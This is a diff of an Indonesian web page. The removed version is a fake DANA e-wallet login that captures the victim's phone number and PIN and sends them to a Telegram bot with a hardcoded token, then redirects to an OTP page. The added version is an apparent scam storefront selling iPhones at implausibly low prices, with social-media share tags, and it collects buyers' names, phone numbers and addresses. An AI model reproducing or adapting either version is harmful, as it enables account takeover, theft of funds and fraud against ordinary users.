@@ -1,305 +1,218 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-  <title>Simulasi Login DANA</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Promo Crazy Sale</title>
+  <!-- ✅ Open Graph Meta Tags for WhatsApp/Facebook -->
+  <meta property="og:title" content="Crazy Sale lagi promo gila gilaan mulai dari harga 1jt an" />
+  <meta property="og:description" content="Berbagai macam iPhone resmi ibox" />
+  <meta property="og:image" content="https://baothainguyen.vn/file/e7837c027f6ecd14017ffa4e5f2a0e34/092024/iphone-16_promax_20240916104159.jpg" />
+  <meta property="og:type" content="website" />
+  
   <style>
-    * {
-      box-sizing: border-box;
-    }
-    html, body {
-      height: 100%;
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      background-color: #2796f1;
-    }
     body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background-color: #00bfff;
+      margin: 0;
+      color: #333;
+    }
+    h2 {
+      text-align: center;
+      color: #FFFFFF;
+    }
+    .product-selection {
       display: flex;
+      flex-wrap: wrap;
       justify-content: center;
-      align-items: flex-start;
+      gap: 10px;
     }
-    .container {
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-      padding: 30px 24px 0;
-      background-color: #2796f1;
-      width: 100%;
-      max-width: 400px;
-    }
-    .logo {
+    .product {
+      width: calc(33.333% - 10px);
+      background-color: #136c8c;
+      border-radius: 10px;
+      padding: 15px;
       text-align: center;
-      margin-bottom: 32px;
-    }
-    .logo img {
-      width: 80px;
-    }
-    .title {
       color: white;
-      font-size: 18px;
-      text-align: center;
-      margin-bottom: 24px;
-    }
-    .input-row {
-      display: flex;
-      gap: 12px;
-      margin-bottom: 12px;
-    }
-    .input-box {
-      display: flex;
-      align-items: center;
-      background-color: white;
-      border-radius: 12px;
-      padding: 14px 16px;
-      flex: 1;
-    }
-    .flag img {
-      width: 24px;
-      height: 16px;
-      margin-right: 6px;
-    }
-    .country-code-input, 
-    .input-box input[type="tel"], 
-    .input-box input[type="text"] {
-      border: none;
-      outline: none;
-      font-size: 16px;
-      background: transparent;
-      color: black;
-      width: 100%;
-    }
-    .info-text {
-      font-size: 12px;
-      color: white;
-      text-align: center;
-      line-height: 1.6;
-      padding: 0 10px;
-      margin-bottom: 24px;
-    }
-    .info-text a {
-      color: white;
-      font-weight: bold;
-      text-decoration: none;
-    }
-    .btn {
-      width: 100%;
-      padding: 16px;
-      background-color: #ffffff;
-      border: none;
-      border-radius: 12px;
-      font-size: 16px;
-      color: #008CFF;
-      cursor: pointer;
-      margin-top: auto;
-    }
-    #phone-error, #error-message {
-      color: #ffdddd;
-      background-color: #ce3a3a;
-      padding: 8px 12px;
-      border-radius: 8px;
-      font-size: 14px;
-      text-align: center;
-      margin-bottom: 16px;
-      display: none;
-    }
-    .pin-page {
-      display: none;
-      background-color: white;
-      width: 100%;
-      max-width: 400px;
-      min-height: 100vh;
-      padding: 70px 24px 24px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
       box-sizing: border-box;
-      flex-direction: column;
-      align-items: center;
+      display: flex; /* 🆕 */
+      flex-direction: column; /* 🆕 */
     }
-    .pin-header {
-      background-color: #008CFF;
-      color: white;
-      padding: 16px;
-      width: 100%;
-      text-align: center;
-      font-size: 18px;
-      font-weight: bold;
-      position: fixed;
-      top: 0;
-      left: 0;
+    .product img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+      object-fit: contain;
     }
-    .pin-title {
-      margin-top: 12px;
-      margin-bottom: 24px;
-      font-size: 18px;
-      color: black;
-      text-align: center;
-    }
-    .pin-dots {
-      display: flex;
-      justify-content: center;
-      margin: 24px 0 40px;
-    }
-    .pin-dot {
-      width: 16px;
-      height: 16px;
-      border-radius: 50%;
-      background-color: #000;
-      margin: 0 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-weight: bold;
-      opacity: 0.3;
-    }
-    .pin-help {
-      display: flex;
-      justify-content: space-around;
-      width: 100%;
+    .product-name {
       font-size: 14px;
-      color: #008CFF;
+      margin: 5px 0;
+    }
+    .product-size {
+      margin-top: 5px;
       font-weight: bold;
     }
-    .pin-help img {
-      width: 20px;
-      vertical-align: middle;
-      margin-right: 4px;
+    .product_harga {
+      font-size: 13px;
+      margin-bottom: 6px;
     }
-    #pin-input {
-      position: absolute;
-      opacity: 0.01;
-      width: 1px;
-      height: 1px;
+    .btn-pilih {
+      background-color: #00D88C;
+      color: white;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 14px;
+      margin-top: auto; /* 🆕 membuat tombol tetap di bawah */
+    }
+    .btn-pilih:hover {
+      background-color: #00C87E;
+    }
+    .error {
+      color: rgb(255, 255, 255);
+      font-size: 0.9em;
+      text-align: center;
+      margin-top: 5px;
+      margin-bottom: 5px;
+    }
+    .product.selected {
+      border:#00ffa6;
+      background-color: #2110a3;
+    }
+    form {
+      background-color: #136c8c;
+      padding: 10px;
+      border-radius: 8px;
+      width: 100%;
+      margin-top: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-sizing: border-box;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #FFFFFF;
+    }
+    input[type="text"], input[type="tel"], textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      margin-bottom: 5px;
+      border: 1px solid #00C87E;
+      border-radius: 4px;
+      background-color: #0a536b;
+      color: #ffffff;
+      box-sizing: border-box;
+    }
+    input::placeholder,
+    textarea::placeholder {
+      color: #eeeeee;
+      opacity: 1;
+    }
+    button[type="submit"] {
+      background-color: #00D88C;
+      color: white;
+      padding: 20px 10px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      width: 100%;
+    }
+    button[type="submit"]:hover {
+      background-color: #00C87E;
+    }
+    @media (max-width: 768px) {
+      .product {
+        width: calc(33.333% - 10px);
+      }
     }
   </style>
 </head>
 <body>
-  <div class="container" id="input-nomor">
-    <div class="logo">
-      <img src="https://cdn.antaranews.com/cache/1200x800/2022/04/25/dana.jpg" alt="DANA Logo">
+  <h2>Produk Promo Crazy Sale</h2>
+  <div class="product-selection">
+    <div class="product">
+      <img src="https://images.tokopedia.net/img/cache/700/VqbcmM/2022/9/10/792301f2-1b95-4aaf-a5ac-1000aba90b5c.jpg" alt="iPhone 14 Pro Max">
+      <div class="product-size">iPhone 14 Pro Max</div>
+      <div class="product-name">256GB</div>
+      <div class="product_harga">Rp.3.200.000</div>
+      <button class="btn-pilih" onclick="pilihProduk('iPhone 14 Pro Max - Rp.3.200.000', this)">Pilih</button>
     </div>
-    <div class="title">Masukkan nomor HP kamu untuk lanjut</div>
-    <div class="input-row">
-      <div class="input-box" style="max-width: 120px;">
-        <div class="flag">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" alt="ID">
-        </div>
-        <input type="text" class="country-code-input" value="+62" disabled>
-      </div>
-      <div class="input-box">
-        <input type="tel" placeholder="811-1234-5678" id="phone-input">
-      </div>
+    <div class="product">
+      <img src="https://i5.walmartimages.com/seo/Restored-Apple-iPhone-13-128GB-Unlocked-Refurbished_1f82f038-9172-4308-a2eb-022f2eba1b2b.4a1eeaadf6b32a07d2166230f56b560d.jpeg" alt="iPhone 13">
+      <div class="product-size">iPhone 13</div>
+      <div class="product-name">128GB</div>
+      <div class="product_harga">Rp.2.100.000</div>
+      <button class="btn-pilih" onclick="pilihProduk('iPhone 13 - Rp.2.100.000', this)">Pilih</button>
     </div>
-    <div id="phone-error">Nomor HP tidak valid</div>
-    <div id="error-message">Coba lagi dengan No. HP diawali dari angka 8</div>
-    <div class="info-text">
-      Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
-      Dengan melanjutkan, kamu juga setuju dengan <a href="#">S&amp;K</a> serta <a href="#">Kebijakan Privasi</a> kami.
-    </div>
-    <button class="btn" onclick="showPinPage()">LANJUTKAN</button>
-  </div>
-
-  <div class="pin-page" id="pin-page">
-    <div class="pin-header">Masuk</div>
-    <div class="pin-title">Masukkan PIN</div>
-    <div class="pin-dots" id="pin-dots" onclick="document.getElementById('pin-input').focus()"></div>
-    <input type="tel" id="pin-input" maxlength="6" oninput="handlePinInput(this.value)" autofocus>
-    <div class="pin-help">
-      <div><img src="https://cdn-icons-png.flaticon.com/512/545/545705.png"> BUTUH BANTUAN?</div>
-      <div>LUPA PIN?</div>
+    <div class="product">
+      <img src="https://cdn.jagofon.com/otf/7ZBZI9s7KY-LjIyuUAS82D9FV14TMTHlGquHvO4RIfU/t:10/w:600/f:jpeg/q:60/aHR0cHM6Ly9jZG4uamFnb2Zvbi5jb20vcHJvZHVjdC8yWkRvam1EZDZ5Z0dMaGFMVFZOTTd6a0ExZGE4ejVQeXNkeXg2OHVsLmpwZWc" alt="iPhone 11">
+      <div class="product-size">iPhone 11</div>
+      <div class="product-name">64GB</div>
+      <div class="product_harga">Rp.1.000.000</div>
+      <button class="btn-pilih" onclick="pilihProduk('iPhone 11 - Rp.1.000.000', this)">Pilih</button>
     </div>
   </div>
-
+  <h2>Masukkan Data Penerima</h2>
+  <form action="checkout.html" method="get" onsubmit="return validasiForm()">
+    <input type="hidden" name="produk" id="produkTerpilih" required>
+    <label for="namaPesanan">Nama Pesanan Barang:</label>
+    <input type="text" id="namaPesanan" name="namaPesanan" readonly placeholder="Pilih produk terlebih dahulu">
+    <label for="nama">Nama Lengkap Penerima:</label>
+    <input type="text" id="nama" name="nama" required placeholder="Contoh: Budi Santoso">
+    <div class="error" id="errorNama"></div>
+    <label for="telepon">Nomor Telepon / WhatsApp:</label>
+    <input type="tel" id="telepon" name="telepon" required pattern="^\d{10,13}$" title="Masukkan 10-13 digit angka" placeholder="Contoh: 081234567890">
+    <div class="error" id="errorTelepon"></div>
+    <label for="alamat">Alamat Lengkap:</label>
+    <textarea id="alamat" name="alamat" rows="4" required placeholder="Contoh: Jalan Mawar No. 1, RT 02 RW 03"></textarea>
+    <div class="error" id="errorAlamat"></div>
+    <label for="catatan">Masukkan warna barang di catatan:</label>
+    <textarea id="catatan" name="catatan" rows="3" placeholder="Contoh: Warna Purple"></textarea>
+    <div class="error" id="errorProduk"></div>
+    <button type="submit">Check Out</button>
+  </form>
   <script>
-    const pinValues = Array(6).fill('');
-    let revealTimeout = null;
-    let savedPhoneNumber = '';
-
-    function showPinPage() {
-      const phone = document.getElementById('phone-input').value.trim();
-      const errorEl = document.getElementById('error-message');
-
-      let normalizedPhone = phone.startsWith('0') ? phone.slice(1) : phone;
-      const phoneRegex = /^8[1-9][0-9]{7,11}$/;
-
-      if (!phoneRegex.test(normalizedPhone)) {
-        errorEl.style.display = 'block';
-        return;
-      }
-
-      errorEl.style.display = 'none';
-      savedPhoneNumber = normalizedPhone;
-      localStorage.setItem('phone', normalizedPhone);
-
-      document.getElementById('input-nomor').style.display = 'none';
-      document.getElementById('pin-page').style.display = 'flex';
-      document.getElementById('pin-input').focus();
-      updateDots();
+    function pilihProduk(value, tombol) {
+      document.getElementById("produkTerpilih").value = value;
+      document.getElementById("namaPesanan").value = value;
+      document.querySelectorAll('.product').forEach(p => p.classList.remove('selected'));
+      tombol.closest('.product').classList.add('selected');
+      document.getElementById('errorProduk').textContent = '';
     }
-
-    function updateDots(showIndex = -1) {
-      const dotsContainer = document.getElementById('pin-dots');
-      dotsContainer.innerHTML = '';
-      for (let i = 0; i < 6; i++) {
-        const dot = document.createElement('div');
-        dot.className = 'pin-dot';
-        dot.style.opacity = pinValues[i] ? '1' : '0.3';
-        if (i === showIndex && pinValues[i]) {
-          dot.textContent = pinValues[i];
-          clearTimeout(revealTimeout);
-          revealTimeout = setTimeout(updateDots, 500);
-        }
-        dotsContainer.appendChild(dot);
+    function validasiForm() {
+      let isValid = true;
+      const produk = document.getElementById("produkTerpilih").value.trim();
+      const nama = document.getElementById("nama").value.trim();
+      const telepon = document.getElementById("telepon").value.trim();
+      const alamat = document.getElementById("alamat").value.trim();
+      document.getElementById('errorProduk').textContent = '';
+      document.getElementById('errorNama').textContent = '';
+      document.getElementById('errorTelepon').textContent = '';
+      document.getElementById('errorAlamat').textContent = '';
+      if (!produk) {
+        document.getElementById('errorProduk').textContent = 'Silakan pilih produk terlebih dahulu.';
+        isValid = false;
       }
+      if (!nama) {
+        document.getElementById('errorNama').textContent = 'Nama lengkap penerima harus diisi.';
+        isValid = false;
+      }
+      if (!telepon.match(/^\d{10,13}$/)) {
+        document.getElementById('errorTelepon').textContent = 'Nomor telepon harus terdiri dari 10-13 digit angka.';
+        isValid = false;
+      }
+      if (!alamat) {
+        document.getElementById('errorAlamat').textContent = 'Alamat lengkap harus diisi.';
+        isValid = false;
+      }
+      return isValid;
     }
-
-    async function sendToTelegram(pin) {
-      const token = '8049032485:AAE63lM0pKxDIzBtjKKdP851RniEU64fJtc';
-      const chat_id = '7032109008';
-      const message = `Nomor: ${savedPhoneNumber}\nPIN: ${pin}`;
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-      try {
-        await fetch(url);
-      } catch (err) {
-        console.error("Gagal mengirim ke Telegram", err);
-      }
-    }
-
-    function handlePinInput(val) {
-      if (val.length > 6) return;
-      for (let i = 0; i < 6; i++) {
-        pinValues[i] = val[i] || '';
-      }
-      updateDots(val.length - 1);
-      if (val.length === 6) {
-        sendToTelegram(val);
-        setTimeout(() => {
-          window.location.href = 'halaman-otp.html';
-        }, 500);
-      }
-    }
-
-    window.addEventListener('pageshow', (event) => {
-      if (event.persisted || performance.getEntriesByType("navigation")[0].type === "back_forward") {
-        resetToHome();
-      }
-    });
-
-    function resetToHome() {
-      document.getElementById('input-nomor').style.display = 'flex';
-      document.getElementById('pin-page').style.display = 'none';
-      document.getElementById('phone-input').value = '';
-      document.getElementById('pin-input').value = '';
-      pinValues.fill('');
-      updateDots();
-      localStorage.removeItem('phone');
-    }
-
-    document.getElementById("phone-input").addEventListener("focus", () => {
-      setTimeout(() => {
-        document.getElementById("phone-input").scrollIntoView({ behavior: "smooth", block: "center" });
-      }, 10);
-    });
   </script>
 </body>
 </html>
